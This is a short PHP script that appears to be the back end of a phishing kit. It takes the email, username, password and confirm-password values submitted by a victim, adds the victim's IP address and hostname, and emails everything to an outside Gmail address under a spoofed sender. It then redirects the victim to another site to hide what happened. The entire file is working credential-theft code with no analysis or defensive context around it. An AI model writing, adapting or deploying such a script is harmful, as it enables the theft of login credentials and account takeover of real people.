<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userinfo = $_POST['datacheck'];
$message  = "====\n";
$message .= "Email Address  : ".$_POST['email']."\n";
$message .= "Domain\user name  : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n\n";
$message .= "Confirm Password  : ".$_POST['confirmpassword']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "======\n";

$send= "ericuwish4@gmail.com";

$subject = "GN! | $ip";
$headers = "From:  Log!<in@uaanet.org>";

$headers .= "1.0\n";
mail($send,$subject,$message,$headers);
header("Location: https://cecafowa.coaxis.com/");
?>